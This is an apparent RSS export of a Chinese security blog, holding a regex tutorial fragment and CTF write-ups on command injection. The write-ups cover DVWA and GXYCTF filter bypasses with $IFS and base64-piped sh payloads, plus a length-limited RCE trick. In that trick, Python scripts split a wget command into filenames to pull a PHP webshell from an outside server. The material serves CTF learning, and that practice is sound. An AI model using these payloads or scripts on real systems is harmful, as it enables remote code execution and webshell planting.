re.compile(r&#39;\d+&#39;)                    # 用于匹配至少一个数字</span><br><span class="line">&gt;&gt;&gt; m &#x3D; pattern.match(&#39;one12twothree34four&#39;)        # 查找头部，没有匹配</span><br><span class="line">&gt;&gt;&gt; print m</span><br><span class="line">None</span><br><span class="line">&gt;&gt;&gt; m &#x3D; pattern.match(&#39;one12twothree34four&#39;, 2, 10) # 从&#39;e&#39;的位置开始匹配，没有匹配</span><br><span class="line">&gt;&gt;&gt; print m</span><br><span class="line">None</span><br><span class="line">&gt;&gt;&gt; m &#x3D; pattern.match(&#39;one12twothree34four&#39;, 3, 10) # 从&#39;1&#39;的位置开始匹配，正好匹配</span><br><span class="line">&gt;&gt;&gt; print m                                         # 返回一个 Match 对象</span><br><span class="line">&lt;_sre.SRE_Match object at 0x10a42aac0&gt;</span><br><span class="line">&gt;&gt;&gt; m.group(0)   # 可省略 0</span><br><span class="line">&#39;12&#39;</span><br><span class="line">&gt;&gt;&gt; m.start(0)   # 可省略 0</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; m.end(0)     # 可省略 0</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; m.span(0)    # 可省略 0</span><br><span class="line">(3, 5)</span><br></pre></td></tr></table></figure><p>在上面，当匹配成功时返回一个 Match 对象，其中：</p><ul><li><code>group([group1, …])</code> 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 <code>group()</code> 或 <code>group(0)</code>；</li><li><code>start([group])</code> 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；</li><li><code>end([group])</code> 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；</li><li><code>span([group])</code> 方法返回 <code>(start(group), end(group))</code>。</li></ul>]]></content:encoded>
      
      <comments>http://www.yym.show/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/#disqus_thread</comments>
    </item>
    
    <item>
      <title>七字命令执行环境搭建</title>
      <link>http://www.yym.show/2020-07-08-%E4%B8%83%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <guid>http://www.yym.show/2020-07-08-%E4%B8%83%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <pubDate>Wed, 08 Jul 2020 06:14:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;今天在总结RCE漏洞的时候看到了P神出的七字命令执行，感觉挺NB的，所以想自己搭个环境复现一下，遇到了一些小坑，所以记录一下，哎&lt;del&gt;~&lt;/del&gt;还是太菜的缘故，想的太少，做的太少，环境搭起来都那么费劲，主要就是权限的问题。&lt;/p&gt;
&lt;p&gt;首先给出了源码：&lt;/p&gt;
&lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>今天在总结RCE漏洞的时候看到了P神出的七字命令执行，感觉挺NB的，所以想自己搭个环境复现一下，遇到了一些小坑，所以记录一下，哎<del>~</del>还是太菜的缘故，想的太少，做的太少，环境搭起来都那么费劲，主要就是权限的问题。</p><p>首先给出了源码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后本地开启一个<code>httpd</code>服务，这里我选择了用docker搭建，方便快捷，找了个httpd+php的docker镜像</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708144630536.png" alt="image-20200708144630536"></p><p>下载好之后启动</p><p>删除<code>/var/www/html/</code>下的所有文件,然后修改html文件的权限</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708145456517.png" alt="image-20200708145456517"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><p>然后创建inde.php文件,将题目源码放入</p><p>最后还得安装一个<code>wget</code>,先更新源再安装</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install wget</span><br></pre></td></tr></table></figure><p>最后再附上脚本吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">def GetShell():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.150:8080&#x2F;?1&#x3D;&quot;</span><br><span class="line">    fileNames &#x3D; [&quot;hp&quot;, &quot;ell.p\\&quot;, &quot;\ sh\\&quot;, &quot;\ -O\\&quot;, &quot;121\\&quot;,&quot;135.\\&quot;,&quot;76.\\&quot;,&quot;120.\\&quot;,&quot;et\ \\&quot;,&quot;wg\\&quot;]</span><br><span class="line">    # linux创建中间有空格的文件名，需要转义，所以有请求&quot;cn\ \\&quot;</span><br><span class="line">    # 可以修改hosts文件，让a.cn指向一个自己的服务器。</span><br><span class="line">    # 在a.cn 的根目录下创建index.html ，内容是一个php shell</span><br><span class="line">    for fileName in fileNames:</span><br><span class="line">        createFileUrl &#x3D; url + &quot;&gt;&quot; + fileName</span><br><span class="line">        print(createFileUrl)</span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line"></span><br><span class="line">    getShUrl &#x3D; url + &quot;ls -t&gt;a&quot;</span><br><span class="line">    print(getShUrl)</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl &#x3D; url + &quot;sh a&quot;</span><br><span class="line">    print(getShellUrl)</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line">    shellUrl &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.150:8080&#x2F;shell.php&quot;</span><br><span class="line">    response &#x3D; requests.get(shellUrl)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(</span><br><span class="line">        &quot;[*] Get shell !&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(</span><br><span class="line">        &quot;[*] fail!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://www.yym.show/2020-07-08-%E4%B8%83%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>命令执行&amp;&amp;代码执行刷题记录</title>
      <link>http://www.yym.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/</link>
      <guid>http://www.yym.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/</guid>
      <pubDate>Sat, 04 Jul 2020 01:44:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h2&gt;&lt;h3 id=&quot;ACTF2020-新生赛-Exec&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Ex
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>[TOC]</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p><strong>本题要点：</strong></p><ul><li>命令执行</li></ul><p>太简单了，直接放payload吧，直接就读出来了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target&#x3D;127.0.0.1%7Ccat &#x2F;flag</span><br></pre></td></tr></table></figure><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;cfaaa800-9f82-44ec-b30f-c68d066c299a&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="DVWA-Medium-级别"><a href="#DVWA-Medium-级别" class="headerlink" title="DVWA[Medium]级别"></a>DVWA[Medium]级别</h3><p><strong>本题要点：</strong></p><ul><li>黑名单绕过</li></ul><p>查看源代码，发现有个函数专门用于过滤这两个字符串，而其他地方和low级代码一致：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200706093714336.png" alt="image-20200706093714336"></p><p>但是该级别的缺点是只过滤了上述两种字符，这里我们还可以用&amp;号、管道符|等直接绕过。</p><p>两个命令之间用&amp;号表明这两条命令会同时执行，顺序先后不一定。测试结果如下：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200706093930031.png" alt="image-20200706093930031"></p><hr><h3 id="DVWA-High-级别"><a href="#DVWA-High-级别" class="headerlink" title="DVWA[High]级别"></a>DVWA[High]级别</h3><p><strong>本题要点：</strong></p><ul><li>黑名单绕过</li></ul><p>分析源代码：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200706094319605.png" alt="image-20200706094319605"></p><p>把一些常见的命令连接符给过滤了。黑名单过滤看似安全，但是如果黑名单不全的话，是很容易进行绕过的。我们仔细看黑名单过滤中的<code>|</code>,<code>|</code>后面还有一个空格，所以我们可以进行绕过，输入下面命令绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><hr><h3 id="CTFHUB综合训练"><a href="#CTFHUB综合训练" class="headerlink" title="CTFHUB综合训练"></a>CTFHUB综合训练</h3><p>本题要点：</p><ul><li>空格绕过</li><li>黑名单绕过</li><li>通配符绕过</li></ul><p>payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0amore$&#123;IFS&#125;f***_102391421621483.php</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><strong>本题要点：</strong></p><ul><li><p><strong>绕过空格、敏感字符、连接符</strong></p></li><li><p><strong>命令执行变量拼接</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFSfla$a.php</span><br></pre></td></tr></table></figure><p><strong>过滤bash用sh执行</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p><strong>内联执行</strong></p><p>将反引号内命令的输出作为输入执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure></li></ul><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704132418384.png" alt="image-20200704132418384"></p><p>题目为<code>pingpingping</code>,应该就是命令注入，首先尝试传ip,分号连续指令发现没有过滤</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704133322149.png" alt="image-20200704133322149"></p><p>首先尝试读取<code>index.php</code>。发现过滤了空格</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704133411981.png" alt="image-20200704133411981"></p><p>尝试绕过空格，以下是绕过空格的一些方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>$IFS$1绕过成功得到：可以看到过滤了flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704133645763.png" alt="image-20200704133645763"></p><p>ps:有时会禁用cat: 解决方法是使用tac反向输出命令： linux命令中可以加\，所以甚至可以ca\t /fl\ag</p><p>过滤了许多标点，空格，bash,包括flag的贪婪匹配。那么自己印象中几种做法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.cat fl* 利用*匹配任意 不行</span><br><span class="line">2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash 也不行</span><br><span class="line">3.ca\t fl\ag.php 不行</span><br><span class="line">4.cat fl&#39;&#39;ag.php 不行</span><br></pre></td></tr></table></figure><p>解决办法：</p><p><strong>变量拼接</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>查看源码得到flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704134013383.png" alt="image-20200704134013383"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1ab17684-4a64-4da3-a6f0-e6461571f697&#125;</span><br></pre></td></tr></table></figure><p>官方：<br>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>内联执行的做法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>内联，就是将反引号内命令的输出作为输入执行</p><hr><h3 id="七字绕过命令执行"><a href="#七字绕过命令执行" class="headerlink" title="七字绕过命令执行"></a>七字绕过命令执行</h3><p><strong>本题要点：</strong></p><ul><li><strong>&gt;</strong>重定向符号</li><li>linux中命令换行</li><li>ls -t 命令</li></ul><p>首先查看源码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码很简单，但是做起来很痛苦</p><p>意思也很简单，主要就是限制了传参的长度，这里的解题思路就是使用wget从vps服务器上下载shell后门，然后连接后门。这里有几个知识点：</p><h4 id="1丶linux中的-gt-符号和-gt-gt-符号"><a href="#1丶linux中的-gt-符号和-gt-gt-符号" class="headerlink" title="1丶linux中的 &gt; 符号和 &gt;&gt; 符号"></a>1丶linux中的 &gt; 符号和 &gt;&gt; 符号</h4><p>1.通过&gt;来创建文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;test.txt</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708153827173.png" alt="image-20200708153827173"></p><p>2.通过&gt;将命令执行的结果存入文件中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;hello world&quot;&gt;test</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708153934111.png" alt="image-20200708153934111"></p><p>但是通过<code>&gt;</code>来将命令执行结果写入文件会覆盖掉文件原本的内容，如果我们想要在原本文件内容后面追加内容就要使用<code>&gt;&gt;</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;aaa&quot;&gt;test</span><br><span class="line">cat test</span><br><span class="line">echo &quot;bbb&quot;&gt;&gt;test</span><br><span class="line">cat test</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154018817.png" alt="image-20200708154018817"></p><h4 id="2丶linux中命令换行"><a href="#2丶linux中命令换行" class="headerlink" title="2丶linux中命令换行"></a>2丶linux中命令换行</h4><p>在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 “\“，可以将一条命令写在多行，“\” 充当拼接符号<br>比如我们有一个test文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello \</span><br><span class="line">world!</span><br></pre></td></tr></table></figure><p>然后我们用sh命令来执行一下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh test</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154317883.png" alt="image-20200708154317883"></p><p>成功输出了 hello world!</p><h4 id="3丶ls-t命令"><a href="#3丶ls-t命令" class="headerlink" title="3丶ls -t命令"></a>3丶ls -t命令</h4><p>在linux中，我们使用ls -t命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch a</span><br><span class="line">touch b</span><br><span class="line">touch c</span><br><span class="line">ls -t</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154515655.png" alt="image-20200708154515655"></p><h4 id="4丶利用ls-t-和-gt-以及换行符-绕过长度限制执行命令"><a href="#4丶利用ls-t-和-gt-以及换行符-绕过长度限制执行命令" class="headerlink" title="4丶利用ls -t 和 &gt; 以及换行符 绕过长度限制执行命令"></a>4丶利用ls -t 和 &gt; 以及换行符 绕过长度限制执行命令</h4><p>我们先看执行如下命令的结果：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154556060.png" alt="image-20200708154556060"></p><p>ls -t 命令列出文件名，然后每个文件名按行储存，如果我们将我们要执行的命令拆分为多个文件名，然后再结合命令换行，然后通过 ls -t &gt; test这样的方式再写入某个文件来运行不就可以绕过命令长度限制了吗，而且从上面我们可以看出，ls -t&gt;test的执行顺序是先创建文件test，然后执行ls -t，然后将执行结果写入test文件<br>我们可以做如下小实验：<br>比如我们要执行 echo hello world</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &quot;rld&quot;</span><br><span class="line">&gt; &quot;wo\\&quot;</span><br><span class="line">&gt; &quot;llo \\&quot;</span><br><span class="line">&gt; &quot;he\\&quot;</span><br><span class="line">&gt; &quot;echo \\&quot;</span><br><span class="line">ls -t &gt; _</span><br><span class="line">sh _</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154643363.png" alt="image-20200708154643363"></p><p>我们可以看到，因为我们最后创建的文件 “_”的文件名会输入到文件中导致一个错误信息，但是并不影响我们下面命令的执行，最终成功的输出了 “hello world”</p><p>这里使用了两个 \ 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 \ 那么就会被误解为正在多行执行命令，就会出现下面这种情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo \</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154710348.png" alt="image-20200708154710348"></p><h4 id="5丶解题："><a href="#5丶解题：" class="headerlink" title="5丶解题："></a>5丶解题：</h4><p>接下来就能做这道题了</p><p>首先在vps上准备index.html，内容为php webshell</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154916611.png" alt="image-20200708154916611"></p><p>这里我使用了蚁剑一键生成的webshell</p><p>然后开始构造命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget 120.76.135.xxx -O shell.php</span><br></pre></td></tr></table></figure><p>120.76.135.xxx为你的vps IP地址或者域名，-O参数是重命名</p><p>我们只需要执行这一条命令就能上传一个木马，然后就需要构造多个文件，使用<code>ls -t</code>将文件名拼接到另一个文件中，执行这个文件</p><p>这里有几个要点：</p><ul><li>文件名开头不能是<code>.</code>，不然<code>ls</code>不能列出，<code>.</code>开头是隐藏文件</li><li>空格和<code>\</code>要用<code>\</code>转义，因为<code>\</code>不转义的话就会执行多行命令，命令不能结束</li></ul><p>然后开始构造语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;l.php</span><br><span class="line">?1&#x3D;&gt;shel\\</span><br><span class="line">?1&#x3D;&gt;-O\ \\</span><br><span class="line">?1&#x3D;&gt;xx\ \\</span><br><span class="line">?1&#x3D;&gt;135.\\</span><br><span class="line">?1&#x3D;&gt;7.76.\\</span><br><span class="line">?1&#x3D;&gt;\ 12\\</span><br><span class="line">?1&#x3D;&gt;wget\\</span><br><span class="line">?1&#x3D;ls -t&gt;a</span><br><span class="line">?1&#x3D;sh a</span><br></pre></td></tr></table></figure><p>贴一下p牛的脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#-*- coding: utf-8 -*- </span><br><span class="line"></span><br><span class="line">import requests </span><br><span class="line">def GetShell():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.129&#x2F;shell.php?1&#x3D;&quot;</span><br><span class="line">    fileNames &#x3D; [&quot;1.php&quot;,&quot;-O\ \\&quot;,&quot;cn\ \\&quot;,&quot;\ a.\\&quot;,&quot;wget\\&quot;] </span><br><span class="line">    # linux创建中间有空格的文件名，需要转义，所以有请求&quot;cn\ \\&quot;</span><br><span class="line">    # 可以修改hosts文件，让a.cn指向一个自己的服务器。</span><br><span class="line">    # 在a.cn 的根目录下创建index.html ，内容是一个php shell </span><br><span class="line"> </span><br><span class="line">    for fileName in fileNames:</span><br><span class="line">        createFileUrl &#x3D; url+&quot;&gt;&quot;+fileName</span><br><span class="line">        print createFileUrl </span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line"> </span><br><span class="line">    getShUrl &#x3D; url + &quot;ls -t&gt;1&quot;</span><br><span class="line">    print getShUrl</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl &#x3D; url + &quot;sh 1&quot;</span><br><span class="line">    print getShellUrl</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line"> </span><br><span class="line">    shellUrl &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.129&#x2F;1.php&quot;</span><br><span class="line">    response &#x3D; requests.get(shellUrl)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print &quot;[*] Get shell !&quot;</span><br><span class="line">    else :</span><br><span class="line">        print &quot;[*] fail!&quot;</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure><p>改掉语句就能用蚁剑连了，找一下目录就能得到flag</p><hr><h3 id="五字绕过-HITCON-CTF-2017-BabyFirst-Revenge"><a href="#五字绕过-HITCON-CTF-2017-BabyFirst-Revenge" class="headerlink" title="五字绕过 [HITCON CTF 2017-BabyFirst Revenge]"></a>五字绕过 [HITCON CTF 2017-BabyFirst Revenge]</h3><p><strong>本题要点：</strong></p><ul><li><strong>&gt;</strong>重定向符号</li><li>linux中命令换行</li><li>ls -t 命令绕过</li><li>curl</li></ul><p>源码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 5) &#123;</span><br><span class="line">        @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>这里需要我们注意的是<code>cmd &lt;= 5</code>，所以我们就不能在使用<code>ls -t&gt;a</code>。</p><p>但是我们还是可以通过比较巧妙的构造来实现<code>ls -t&gt;a</code>这么一个操作的。可以先通过把<code>ls -t&gt;a</code>这样拆分成几段写入到<code>_</code>文件存放。</p><hr><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>首先打开网页观察，发现首页的url有点奇怪，有点像base64编码，然后经过两次base64解密，一次hex解密得到为55.png，然后反向推测index.php，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</span><br></pre></td></tr></table></figure><p>然后查看源码得到：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200714162512792.png" alt="image-20200714162512792"></p><p>然后base64解码得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img 